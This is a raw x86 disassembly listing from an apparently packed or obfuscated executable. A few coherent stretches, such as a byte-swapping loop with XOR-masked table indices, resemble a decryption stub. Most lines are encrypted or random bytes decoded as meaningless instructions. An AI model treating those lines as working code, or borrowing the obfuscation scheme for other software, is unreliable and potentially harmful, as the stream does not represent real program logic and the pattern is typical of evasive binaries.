  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    dx,WORD PTR ds:[esi+0x2e581ea3]
  40c148:	mov    esi,DWORD PTR [eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c0f5
  40c150:	mov    eax,0xfe0e5913
  40c155:	test   eax,edi
  40c157:	inc    ecx
  40c158:	add    eax,0xbcd812ed
  40c15d:	cmc    
  40c15e:	fdiv   DWORD PTR [edx-0x3cc6ff43]
  40c164:	mov    ds:0xb634f8ce,eax
  40c169:	enter  0x4921,0xb8
  40c16d:	mov    ebx,DWORD PTR [edx-0x7abf53a1]
  40c173:	sub    DWORD PTR [ecx+0x44b10f53],edi
  40c179:	icebp  
  40c17a:	popa   
  40c17b:	sub    BYTE PTR [edi+0x59a3ad5d],0xbf
  40c182:	adc    ecx,0xfffffff0
  40c185:	push   ebp
  40c186:	jl     0x40c1e7
  40c188:	xchg   ebx,eax
  40c189:	sbb    DWORD PTR [edx],esp
  40c18b:	hlt    
  40c18c:	bound  esp,QWORD PTR gs:[ebp+0x38b78904]
  40c193:	imul   esp,DWORD PTR [edx],0xa1e46d62
  40c199:	pop    eax
  40c19a:	aam    0x36
  40c19c:	(bad)  
  40c19e:	std    
  40c19f:	push   ecx
  40c1a0:	dec    esi
  40c1a1:	ins    BYTE PTR es:[edi],dx
  40c1a2:	stos   DWORD PTR es:[edi],eax
  40c1a3:	stc    
  40c1a4:	or     cl,BYTE PTR [ecx]
  40c1a6:	jg     0x40c224
  40c1a8:	xchg   ebp,eax
  40c1a9:	push   cs
  40c1aa:	sbb    eax,0x589b373d
  40c1af:	repnz (bad) 
  40c1b1:	fs or  eax,0x5371b526
  40c1b7:	retf   0xcc36
  40c1ba:	fst    QWORD PTR [esi]
  40c1bc:	inc    ebp
  40c1bd:	stc    
  40c1be:	push   ss
  40c1bf:	jo     0x40c16b
  40c1c1:	push   es
  40c1c2:	not    BYTE PTR [edx+0x2f]
  40c1c5:	xchg   esp,eax
  40c1c6:	inc    esp
  40c1c7:	sbb    dh,BYTE PTR [esi+0x64]
  40c1ca:	aas    
  40c1cb:	pop    ebx
  40c1cc:	cmp    al,0x55
  40c1ce:	ret    
  40c1cf:	lock sub esp,DWORD PTR [esi]
  40c1d2:	or     ch,BYTE PTR [edx-0x706e938d]
  40c1d8:	sbb    BYTE PTR [edx-0x1fa7d61c],ah
  40c1de:	dec    ecx
  40c1df:	cmp    DWORD PTR [eax],0x6e2a870e
  40c1e5:	js     0x40c19d
  40c1e7:	aad    0xef
  40c1e9:	mov    ecx,0xb979d587
  40c1ee:	dec    ecx
  40c1ef:	(bad)  [ecx+0x55]
  40c1f2:	or     eax,0xb1e460bc
  40c1f7:	dec    ecx
  40c1f8:	bswap  esi
  40c1fa:	fcomip st,st(5)
  40c1fc:	add    eax,0x65ce2b38
  40c201:	mov    ah,0x38
  40c203:	cld    
  40c204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c205:	out    dx,al
  40c206:	ret    0x388a
  40c209:	pop    ebx
  40c20a:	mov    ds:0xd6410a77,al
  40c20f:	xlat   BYTE PTR ds:[ebx]
  40c210:	ffreep st(4)
  40c212:	or     ch,BYTE PTR [eax+0x12a61a48]
  40c218:	gs std 
  40c21a:	jmp    0x5338:0x7cc65be8
  40c221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c222:	adc    eax,DWORD PTR [ebp-0x3]
  40c225:	lods   al,BYTE PTR ds:[esi]
  40c226:	retf   
  40c227:	mov    dh,0xa1
  40c229:	cmp    al,0x3f
  40c22b:	inc    esp
  40c22c:	outs   dx,BYTE PTR ds:[esi]
  40c22d:	shr    BYTE PTR [ecx-0x62],cl
  40c230:	or     dh,BYTE PTR [ecx+0x32e95192]
  40c236:	mov    dh,BYTE PTR [ecx]
  40c238:	ss int3 
  40c23a:	bsr    ecx,DWORD PTR [ebp-0x1c5e46ce]
  40c241:	jmp    0x40c2b9
  40c243:	jl     0x40c21a
  40c245:	push   edx
  40c246:	inc    edx
  40c247:	sub    cl,BYTE PTR [ecx-0x14]
  40c24a:	sub    BYTE PTR [eax],bh
  40c24c:	into   
  40c24d:	es stos DWORD PTR es:[edi],eax
  40c24f:	outs   dx,BYTE PTR ds:[esi]
  40c250:	or     BYTE PTR [eax-0x46e100b5],bl
  40c256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c257:	push   0x13894491
  40c25c:	push   edx
  40c25d:	mov    ah,0xd
  40c25f:	retf   0xa44d
  40c262:	iret   
  40c263:	push   cs
  40c264:	push   ss
  40c265:	lods   al,BYTE PTR ds:[esi]
  40c266:	imul   edx,DWORD PTR [eax+eiz*4],0xfffffff4
  40c26a:	out    0x26,eax
  40c26c:	jl     0x40c277
  40c26e:	je     0x40c267
  40c270:	adc    DWORD PTR [edi-0x37df3b3c],eax
  40c276:	pop    ebp
  40c277:	push   esp
  40c278:	ret    
  40c279:	cmc    
  40c27a:	mov    ds:0x42ca3e0d,al
  40c27f:	adc    ebp,edi
  40c281:	stos   BYTE PTR es:[edi],al
  40c282:	stos   BYTE PTR es:[edi],al
  40c283:	sbb    eax,0x99bf31b
  40c288:	fcomp  st(0)
  40c28a:	jnp    0x40c2db
  40c28c:	dec    eax
  40c28d:	sti    
  40c28e:	xor    BYTE PTR [esi+0x5a],bl
  40c291:	inc    esp
  40c292:	cmp    eax,0xbbfe33b7
  40c297:	ret    
  40c298:	push   cs
  40c299:	adc    BYTE PTR [edi+0x63],0x82
  40c29d:	out    0x10,eax
  40c29f:	sub    bl,bl
  40c2a1:	pop    esi
  40c2a2:	out    dx,al
  40c2a3:	jbe    0x40c320
  40c2a5:	add    al,0x8b
  40c2a7:	rcl    edx,cl
  40c2a9:	push   esp
  40c2aa:	in     eax,0xa2
  40c2ac:	dec    dh
  40c2ae:	pop    ss
  40c2af:	hlt    
  40c2b0:	add    DWORD PTR [eax+ecx*4+0x3719577a],ebp
  40c2b7:	call   0xaf0fcead
  40c2bc:	sahf   
  40c2bd:	xor    eax,esi
  40c2bf:	sbb    al,0xf7
  40c2c1:	push   esp
  40c2c2:	jae    0x40c2bf
  40c2c4:	test   DWORD PTR ds:0x109c1233,esp
  40c2ca:	xor    eax,0x19ebad5c
  40c2cf:	push   edi
  40c2d0:	cs or  bh,dl
  40c2d3:	and    BYTE PTR [edi+0x69],cl
  40c2d6:	mov    ch,0x2
  40c2d8:	rol    BYTE PTR [ebp-0x7b7fb676],0x72
  40c2df:	repz cmp DWORD PTR [ebp-0x4c],0x26588038
  40c2e7:	inc    esi
  40c2e8:	push   cs
  40c2e9:	rcl    BYTE PTR [ebp+0x2160232],1
  40c2ef:	inc    ecx
  40c2f0:	mov    dl,0x8b
  40c2f2:	and    dh,BYTE PTR ds:0xbb3d20f1
  40c2f8:	adc    al,bh
  40c2fa:	mov    dl,0x8
  40c2fc:	fadd   DWORD PTR [ebp-0x9]
  40c2ff:	jecxz  0x40c2cc
  40c301:	mov    edi,0xb46fc156
  40c306:	xor    BYTE PTR [esi-0x274f5d84],bh
  40c30c:	aam    0x60
  40c30e:	add    edi,DWORD PTR [edx-0x469f8846]
  40c314:	cmp    BYTE PTR [edx+ebx*1+0x5ff7ae3a],ah
  40c31b:	out    dx,eax
  40c31c:	int3   
  40c31d:	int    0x9b
  40c31f:	js     0x40c37c
  40c321:	mov    ebp,0x90170c81
  40c326:	into   
  40c327:	dec    eax
  40c328:	inc    DWORD PTR [ebx-0x20]
  40c32b:	or     eax,0x886e4fa2
  40c330:	mov    ebp,0xf0fcbb7d
  40c335:	int3   
  40c336:	push   cs
  40c337:	fldenv [edi]
  40c339:	ins    BYTE PTR es:[edi],dx
  40c33a:	mov    al,0xc5
  40c33c:	pop    eax
  40c33d:	fistp  DWORD PTR [edi+0x1d]
  40c340:	lods   eax,DWORD PTR ds:[esi]
  40c341:	and    DWORD PTR [ebx+0x44],ebx
  40c344:	daa    
  40c345:	xchg   esp,eax
  40c346:	inc    ebp
  40c347:	cmp    BYTE PTR [ecx],ah
  40c349:	jmp    0x40c2d2
  40c34b:	add    DWORD PTR [ecx-0x6b0982a],ebx
  40c351:	pop    esp
  40c352:	or     al,al
  40c354:	mov    ch,0x8
  40c356:	fstp   TBYTE PTR [ecx]
  40c358:	jg     0x40c307
  40c35a:	pop    edx
  40c35b:	(bad)  
  40c35c:	sbb    edx,DWORD PTR [ebx]
  40c35e:	pop    ebp
  40c35f:	mov    ch,0xa7
  40c361:	sbb    al,0xb7
  40c363:	add    al,0x86
  40c365:	push   esi
  40c366:	stos   DWORD PTR es:[edi],eax
  40c367:	xor    DWORD PTR [esi+0x21064e95],0x453b28c9
  40c371:	pop    ecx
  40c372:	inc    edi
  40c373:	cmp    edx,DWORD PTR [eax]
  40c375:	dec    ecx
  40c376:	out    0xd4,al
  40c378:	clc    
  40c379:	cmp    BYTE PTR [esi+0x18],0xc4
  40c37d:	fs and dl,dl
  40c380:	or     cl,al
  40c382:	xchg   esi,eax
  40c383:	and    DWORD PTR ds:0x20aeb5f0,ecx
  40c389:	and    al,0x5c
  40c38b:	pop    esi
  40c38c:	jecxz  0x40c367
  40c38e:	ret    0x8beb
  40c391:	cmp    esp,DWORD PTR [edx]
  40c393:	sahf   
  40c394:	mov    ds:0xd7912a3c,al
  40c399:	sbb    eax,0x998f68f4
  40c39e:	daa    
  40c39f:	xchg   DWORD PTR [edx+0x1cd5f47d],edi
  40c3a5:	repz aas 
  40c3a7:	dec    eax
  40c3a8:	cmc    
  40c3a9:	or     DWORD PTR ds:0x6d443f8,ebx
  40c3af:	and    dl,cl
  40c3b1:	test   al,0xc5
  40c3b3:	call   0xe71c147
  40c3b8:	xchg   edi,eax
  40c3b9:	jecxz  0x40c422
  40c3bb:	into   
  40c3bc:	jp     0x40c41d
  40c3be:	jmp    ebp
  40c3c0:	push   ds
  40c3c1:	loop   0x40c3a5
  40c3c3:	call   0x98d9:0xb0968725
  40c3ca:	push   es
  40c3cb:	loopne 0x40c3ba
  40c3cd:	jl     0x40c3b3
  40c3cf:	mov    edi,0x9f413146
  40c3d4:	mov    eax,0x44d93d6a
  40c3d9:	jle    0x40c41b
  40c3db:	(bad)  
  40c3dd:	loopne 0x40c449
  40c3df:	dec    ebp
  40c3e0:	mov    bl,0xea
  40c3e2:	dec    edi
  40c3e3:	in     eax,0x22
  40c3e5:	imul   esi,ebx,0x6d0c546e
  40c3eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3ec:	loope  0x40c43f
  40c3ee:	inc    ecx
  40c3ef:	jg     0x40c408
  40c3f1:	push   ecx
  40c3f2:	lock adc ecx,DWORD PTR ds:0xa164f994
  40c3f9:	xchg   esi,eax
  40c3fa:	leave  
  40c3fb:	jp     0x40c402
  40c3fd:	push   ecx
  40c3fe:	or     eax,0xfea8a8
  40c403:	jl     0x40c3c1
  40c405:	jno    0x40c429
  40c407:	ins    BYTE PTR es:[edi],dx
  40c408:	je     0x40c3ce
  40c40a:	mov    al,0xef
  40c40c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c40d:	sbb    eax,DWORD PTR [ebx]
  40c40f:	pop    ecx
  40c410:	sbb    dl,dl
  40c412:	xor    eax,0xd59628b9
  40c417:	lea    bp,[ecx-0x28]
  40c41b:	fbld   TBYTE PTR [esi+0x54]
  40c41e:	pop    ebp
  40c41f:	bound  ebx,QWORD PTR [edi-0x41e93261]
  40c425:	jmp    FWORD PTR [esi-0x73da2d]
  40c42b:	mov    al,0x7f
  40c42d:	pop    edx
  40c42e:	in     al,0x73
  40c430:	inc    eax
  40c431:	sar    BYTE PTR [edi-0x5],1
  40c434:	or     esi,DWORD PTR [esi]
  40c436:	sbb    eax,0x59cf0dac
  40c43b:	retf   0xb827
  40c43e:	data16 loop 0x40c3f1
  40c441:	call   0xab10:0xbca58e61
  40c448:	out    dx,eax
  40c449:	clc    
  40c44a:	xor    BYTE PTR [ebx],ah
  40c44c:	jns    0x40c3ce
  40c44e:	pop    ss
  40c44f:	ret    0xb163
  40c452:	and    bh,dh
  40c454:	sub    dh,BYTE PTR [edx]
  40c456:	nop
  40c457:	inc    edx
  40c458:	cmp    dl,BYTE PTR [ebx+0x217ccd8e]
  40c45e:	and    BYTE PTR [ecx],dh
  40c460:	add    cl,BYTE PTR [ecx]
  40c462:	pushf  
  40c463:	mov    al,ds:0x97045eea
  40c468:	jg     0x40c49f
  40c46a:	jg     0x40c445
  40c46c:	sbb    esp,edx
  40c46e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c46f:	xlat   BYTE PTR ds:[ebx]
  40c470:	out    dx,al
  40c471:	ja     0x40c466
  40c473:	add    ebp,0x9
  40c476:	mov    cs,WORD PTR [edx]
  40c478:	lods   al,BYTE PTR ds:[esi]
  40c479:	add    eax,0xed387d5f
  40c47e:	xchg   edi,eax
  40c47f:	lods   eax,DWORD PTR ds:[esi]
  40c480:	and    edi,ebx
  40c482:	jecxz  0x40c49a
  40c484:	lds    esp,FWORD PTR [eax-0x5d]
  40c487:	xchg   BYTE PTR [ebx-0x25],bl
  40c48a:	daa    
  40c48b:	push   ds
  40c48c:	cmp    al,BYTE PTR [eax-0x27]
  40c48f:	cmp    eax,0xedb64df0
  40c494:	cmp    eax,0x59bcf25b
  40c499:	xchg   ebx,eax
  40c49a:	cli    
  40c49b:	ins    DWORD PTR es:[edi],dx
  40c49c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c49d:	push   ds
  40c49e:	sbb    al,0x28
  40c4a0:	adc    al,BYTE PTR ds:0xcc9e74e5
  40c4a6:	sub    DWORD PTR [ebx-0x5527bdec],eax
  40c4ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4ad:	or     BYTE PTR [ebp+0x6f],0x64
  40c4b1:	hlt    
  40c4b2:	mov    esp,DWORD PTR [ebx-0x26]
  40c4b5:	sti    
  40c4b6:	add    cl,dh
  40c4b8:	mov    ds:0x8578475e,al
  40c4bd:	aaa    
  40c4be:	cwde   
  40c4bf:	pusha  
  40c4c0:	mov    cl,BYTE PTR [eax]
  40c4c2:	xchg   DWORD PTR [ebp-0x1d],esi
  40c4c5:	jle    0x40c526
  40c4c7:	jmp    0x40c46e
  40c4c9:	test   BYTE PTR fs:[ecx],dl
  40c4cc:	ins    DWORD PTR es:[edi],dx
  40c4cd:	and    eax,0xca85aca5
  40c4d2:	sub    bh,BYTE PTR [esi-0x42]
  40c4d5:	test   BYTE PTR [esi+ebx*8-0x36867eec],bh
  40c4dc:	sahf   
  40c4dd:	bound  ebx,QWORD PTR [esp]
  40c4e0:	sbb    DWORD PTR [edx],edx
  40c4e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4e3:	imul   edx,DWORD PTR [eax],0x21445444
  40c4e9:	imul   DWORD PTR [ecx]
  40c4eb:	les    eax,FWORD PTR [ebx+edi*1]
  40c4ee:	sbb    bh,BYTE PTR [ecx+0x5503d033]
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	jl     0x40c599
  40c542:	xchg   ebx,eax
  40c543:	mov    edx,0x7070884d
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c55d
  40c54d:	add    BYTE PTR [ebp+0x75],bh
  40c550:	push   ecx
  40c551:	inc    edi
  40c552:	call   0x609:0xed94ba67
  40c559:	loopne 0x40c54f
  40c55b:	call   0x2fe2:0xff874cec
  40c562:	jmp    0x8c12:0x6ecad9b2
  40c569:	neg    BYTE PTR [edx]
  40c56b:	les    ebp,FWORD PTR [edi+0x672f349f]
  40c571:	inc    ebx
  40c572:	(bad)  
  40c573:	cmp    dh,BYTE PTR [ebp+0x9]
  40c576:	cld    
  40c577:	pop    ebp
  40c578:	xor    BYTE PTR [ebp+eax*1-0x6c1e9e6d],bl
  40c57f:	push   cs
  40c580:	add    eax,0x1675ebc0
  40c585:	cmc    
  40c586:	fwait
  40c587:	rcl    BYTE PTR [edx+ebx*4+0x0],cl
  40c58b:	out    dx,al
  40c58c:	push   ebp
  40c58d:	out    0x13,al
  40c58f:	mov    bl,0x16
  40c591:	js     0x40c585
  40c593:	xor    DWORD PTR [ecx-0x6a7e0cbd],0x718e53f1
  40c59d:	jl     0x40c57c
  40c59f:	dec    eax
  40c5a0:	aaa    
  40c5a1:	adc    BYTE PTR [ecx+0x1672a53a],cl
  40c5a7:	inc    esp
  40c5a8:	shl    DWORD PTR [eax-0x75],0xc1
  40c5ac:	sbb    BYTE PTR [ecx+0x78],0x8c
  40c5b0:	mov    eax,ds:0x55d5fc75
  40c5b5:	cld    
  40c5b6:	mov    DWORD PTR [edi-0x79],ecx
  40c5b9:	add    DWORD PTR [ecx-0x7a156b78],edi
  40c5bf:	add    eax,0xbcd60268
  40c5c4:	jg     0x40c55b
  40c5c6:	adc    al,0xd8
  40c5c8:	dec    ebp
  40c5c9:	outs   dx,DWORD PTR ds:[esi]
  40c5ca:	jno    0x40c5ac
  40c5cc:	aam    0x2c
  40c5ce:	push   cs
  40c5cf:	js     0x40c5df
  40c5d1:	adc    al,0x50
  40c5d3:	(bad)  [edx-0xd]
  40c5d6:	mov    WORD PTR [ebp-0x16],?
  40c5d9:	data16 hlt 
  40c5db:	pop    ebx
  40c5dc:	test   BYTE PTR [eax],dh
  40c5de:	fsubr  QWORD PTR [edx-0x1]
  40c5e1:	jmp    0xb9771866
  40c5e6:	jb     0x40c5a2
  40c5e8:	cwde   
  40c5e9:	sbb    eax,0x3c17d834
  40c5ee:	xor    eax,0x5bbbe5c
  40c5f3:	pushf  
  40c5f4:	mov    ds:0x992cabe7,eax
  40c5f9:	je     0x40c5dc
  40c5fb:	popf   
  40c5fc:	iret   
  40c5fd:	in     eax,dx
  40c5fe:	cdq    
  40c5ff:	mov    WORD PTR [edx+ebx*1+0x4c],cs
  40c603:	inc    esp
  40c604:	mov    dl,0x7b
  40c606:	jns    0x40c5e5
  40c608:	inc    ebp
  40c609:	jmp    0x5d6b151c
  40c60e:	int3   
  40c60f:	inc    esi
  40c610:	xor    BYTE PTR [eax+edi*2-0x30ffe2dc],ah
  40c617:	(bad)  
  40c618:	test   eax,0xb10ba228
  40c61d:	xchg   ecx,eax
  40c61e:	sub    al,0xed
  40c620:	sbb    bh,dh
  40c622:	jae    0x40c5b2
  40c624:	jne    0x40c644
  40c626:	ds (bad) 
  40c62a:	pop    edx
  40c62b:	adc    al,0x78
  40c62d:	xchg   ecx,eax
  40c62e:	(bad)  [ebx+0x3eb07889]
  40c634:	fadd   DWORD PTR [esi+0x703877da]
  40c63a:	les    ecx,FWORD PTR [esp+ebp*8-0xe86ebca]
  40c641:	pop    ss
  40c642:	retf   0xc37e
  40c645:	dec    eax
  40c646:	xchg   ebp,eax
  40c647:	mov    esp,0x2d150b13
  40c64c:	dec    eax
  40c64d:	out    0xdd,al
  40c64f:	cmp    dh,bl
  40c651:	sub    al,0x64
  40c653:	xchg   ebx,eax
  40c654:	add    DWORD PTR [eax-0x22a7a2f8],esp
  40c65a:	mov    edx,0x8ea640db
  40c65f:	in     eax,dx
  40c660:	test   BYTE PTR [eax+0x1c05ff04],ch
  40c666:	add    al,0xfe
  40c668:	jae    0x40c6b1
  40c66a:	sub    ebp,0x9d7b0195
  40c670:	sub    cl,BYTE PTR [ebp+0x78e574a]
  40c676:	cdq    
  40c677:	xchg   esi,eax
  40c678:	pop    esi
  40c679:	rcl    bl,cl
  40c67b:	jae    0x40c6c6
  40c67d:	xchg   edi,eax
  40c67e:	sbb    BYTE PTR [edi-0x2b],0x2d
  40c682:	dec    esp
  40c683:	lock sbb eax,0x961f712e
  40c689:	test   BYTE PTR [esi-0x6c],0x39
  40c68d:	(bad)  
  40c68f:	xchg   BYTE PTR [esi-0x424da9a7],ch
  40c695:	(bad)  
  40c697:	inc    eax
  40c698:	dec    ebp
  40c699:	pop    edx
  40c69a:	enter  0x9f36,0xc7
  40c69e:	cmp    al,0xcb
  40c6a0:	dec    esp
  40c6a1:	push   0xffffffc0
  40c6a3:	inc    esp
  40c6a4:	cmc    
  40c6a5:	dec    edx
  40c6a6:	xor    cl,BYTE PTR [edx]
  40c6a8:	xor    eax,0xba861c07
  40c6ad:	add    ch,BYTE PTR [ecx-0x40]
  40c6b0:	cld    
  40c6b1:	dec    esp
  40c6b2:	inc    eax
  40c6b3:	add    ecx,DWORD PTR [edi+0x722a24da]
  40c6b9:	in     eax,0x65
  40c6bb:	fsub   DWORD PTR [ebx-0x38]
  40c6be:	push   esi
  40c6bf:	pop    esi
  40c6c0:	out    0xca,al
  40c6c2:	pop    es
  40c6c3:	cmp    eax,DWORD PTR [ebx+0x2a]
  40c6c6:	popf   
  40c6c7:	dec    esi
  40c6c8:	dec    ebx
  40c6c9:	mov    ds:0x3a55ce89,al
  40c6ce:	cdq    
  40c6cf:	or     dl,BYTE PTR [esi-0x66]
  40c6d2:	pop    ebp
  40c6d3:	jbe    0x40c6e0
  40c6d5:	push   ds
  40c6d6:	cmp    BYTE PTR [edi],dl
  40c6d8:	and    eax,0x87c5c567
  40c6dd:	push   eax
  40c6de:	shr    bl,cl
  40c6e0:	sbb    eax,0x67ac5b92
  40c6e5:	mov    ds:0xd0aa70ad,eax
  40c6ea:	ret    0x1eaa
  40c6ed:	push   ebx
  40c6ee:	mov    ecx,0xadaf93ec
  40c6f3:	and    al,0xc5
  40c6f5:	and    ebx,ebp
  40c6f7:	js     0x40c6a1
  40c6f9:	push   edi
  40c6fa:	adc    eax,0x65d355c6
  40c6ff:	stc    
  40c700:	or     ebp,DWORD PTR [eax+0x176ea2cd]
  40c706:	out    0x77,eax
  40c708:	mov    ds:0x7a2133a3,al
  40c70d:	mov    al,ds:0xb41f28fe
  40c712:	dec    edi
  40c713:	sbb    ah,bl
  40c715:	clc    
  40c716:	mov    ecx,0x5c8e59ea
  40c71b:	not    BYTE PTR [esi]
  40c71d:	es push ecx
  40c71f:	cmp    bh,bl
  40c721:	or     DWORD PTR [edx-0x3d],esp
  40c724:	adc    eax,0x5e1333de
  40c729:	mov    al,ds:0x1e0402f1
  40c72e:	push   esp
  40c72f:	adc    DWORD PTR [ecx+0x65d34510],edi
  40c735:	and    DWORD PTR [edx-0xa6916b0],ecx
  40c73b:	pusha  
  40c73c:	inc    edx
  40c73d:	sub    esi,DWORD PTR [esi-0x6b]
  40c740:	aad    0x35
  40c742:	nop
  40c743:	pop    ebp
  40c744:	ins    BYTE PTR es:[edi],dx
  40c745:	ror    DWORD PTR [ebp-0x38],cl
  40c748:	add    DWORD PTR [ebp+0x48],ebp
  40c74b:	mov    BYTE PTR [edx],ch
  40c74d:	lds    eax,FWORD PTR [ebp-0x3a]
  40c750:	xchg   ebx,eax
  40c751:	retf   0x297a
  40c754:	cmp    BYTE PTR [ecx-0x70],dl
  40c757:	enter  0x57e0,0x80
  40c75b:	pop    edi
  40c75c:	mov    cl,BYTE PTR [ecx]
  40c75e:	repnz sub ebp,DWORD PTR [edi]
  40c761:	lds    edx,FWORD PTR [ecx+0x5e]
  40c764:	pop    esi
  40c765:	xchg   edi,eax
  40c766:	outs   dx,BYTE PTR ds:[esi]
  40c767:	mov    esi,0x4df0deb4
  40c76c:	fbstp  TBYTE PTR [edx-0x5a]
  40c76f:	xchg   ecx,eax
  40c770:	adc    bh,al
  40c772:	sbb    dl,BYTE PTR [ebx+0x6a]
  40c775:	mov    al,ds:0x653eeaa4
  40c77b:	inc    esi
  40c77c:	ins    BYTE PTR es:[edi],dx
  40c77d:	sub    BYTE PTR [ebx-0x16c0438],0xcc
  40c784:	mov    al,0xe8
  40c786:	out    dx,eax
  40c787:	sub    BYTE PTR [esi],bh
  40c789:	and    DWORD PTR [edi+edx*2],edx
  40c78c:	mov    bl,0x10
  40c78e:	adc    bh,BYTE PTR [ecx+ebp*4]
  40c791:	mov    esi,0xee596229
  40c796:	pop    es
  40c797:	cmp    BYTE PTR fs:[eax-0x7d],dh
  40c79b:	xchg   BYTE PTR [eax+0x5627f334],dh
  40c7a1:	xchg   esi,eax
  40c7a2:	out    dx,al
  40c7a3:	pop    ebp
  40c7a4:	repnz dec edi
  40c7a6:	xchg   BYTE PTR [eax+edi*1-0x5e12f2f6],dh
  40c7ad:	int3   
  40c7ae:	push   edx
  40c7af:	std    
  40c7b0:	mov    esi,0xfc816862
  40c7b5:	add    al,bh
  40c7b7:	test   BYTE PTR [ebp+0x2],bh
  40c7ba:	inc    esp
  40c7bb:	int3   
  40c7bc:	add    eax,DWORD PTR [edx+0xe]
  40c7bf:	jns    0x40c754
  40c7c1:	push   0x5864cdb6
  40c7c6:	push   ecx
  40c7c7:	jae    0x40c78c
  40c7c9:	jle    0x40c7d7
  40c7cb:	push   esp
  40c7cc:	xlat   BYTE PTR ds:[ebx]
  40c7cd:	aad    0xab
  40c7cf:	xlat   BYTE PTR ds:[ebx]
  40c7d0:	loope  0x40c79e
  40c7d2:	push   ds
  40c7d3:	and    dl,BYTE PTR [ebx+0x47]
  40c7d6:	xchg   edx,eax
  40c7d7:	pop    DWORD PTR [ecx+0x74]
  40c7da:	pop    ds
  40c7db:	sub    BYTE PTR [ebx],bh
  40c7dd:	stos   DWORD PTR es:[edi],eax
  40c7de:	pop    esi
  40c7df:	xor    al,0xd
  40c7e1:	or     eax,0x5fe7048
  40c7e6:	in     eax,dx
  40c7e7:	in     eax,dx
  40c7e8:	jmp    0x40c83a
  40c7ea:	cmp    dh,BYTE PTR [edx+eiz*1+0x5a4942b4]
  40c7f1:	dec    DWORD PTR [eax]
  40c7f3:	sbb    al,0x95
  40c7f5:	xor    al,0x75
  40c7f7:	ins    DWORD PTR es:[edi],dx
  40c7f8:	mov    ah,0xeb
  40c7fa:	inc    esp
  40c7fb:	inc    edx
  40c7fc:	pop    ebp
  40c7fd:	jbe    0x40c7b1
  40c7ff:	pop    ebx
  40c800:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40c802:	mov    al,ds:0x6b7a7dea
  40c807:	lea    edx,[edi+0x3e73db4f]
  40c80d:	test   al,0xc4
  40c80f:	cmp    eax,0xa1244433
  40c814:	mov    bh,0xf4
  40c816:	push   cs
  40c817:	inc    ebp
  40c818:	inc    ebp
  40c819:	jno    0x40c83c
  40c81b:	ret    
  40c81c:	jge    0x40c815
  40c81e:	mov    ah,bh
  40c820:	mov    esp,?
  40c822:	outs   dx,DWORD PTR ds:[esi]
  40c823:	out    0x89,eax
  40c825:	(bad)  
  40c826:	in     al,dx
  40c827:	inc    ebx
  40c828:	mov    eax,0x2bd24dbd
  40c82d:	pop    es
  40c82e:	jae    0x40c891
  40c830:	adc    eax,0x2e80d4c6
  40c835:	adc    eax,0x49f7d709
  40c83a:	pop    ss
  40c83b:	aam    0x20
  40c83d:	mov    bh,BYTE PTR [eax+0x77eaa017]
  40c843:	shr    ch,0xeb
  40c846:	ss xchg esi,eax
  40c848:	loope  0x40c7fe
  40c84a:	ret    0x13f
  40c84d:	aam    0x3f
  40c84f:	popa   
  40c850:	lods   al,BYTE PTR ds:[esi]
  40c851:	jmp    0x881fad8a
  40c856:	int    0xe1
  40c858:	adc    esi,DWORD PTR ds:0x7e0b3548
  40c85e:	mov    ebp,ebp
  40c860:	push   ds
  40c861:	or     DWORD PTR [edx-0x460bec5d],esi
  40c867:	xor    bl,BYTE PTR [ebx+ecx*1-0x45d84673]
  40c86e:	cmp    edi,DWORD PTR [edx+0x69]
  40c871:	adc    BYTE PTR [esi-0x28cfa09],ch
  40c877:	jmp    0x6a85:0xe4a50fed
  40c87e:	mov    al,0x14
  40c880:	add    eax,0xa469b8cd
  40c886:	pop    es
  40c887:	sub    esp,edi
  40c889:	mov    eax,ds:0xb814aab8
  40c88e:	fsubr  st,st(4)
  40c890:	or     eax,DWORD PTR [eax-0x6d]
  40c893:	call   0xc0d6:0x4de3f8d8
  40c89a:	mov    ds:0x7b76315,eax
  40c89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
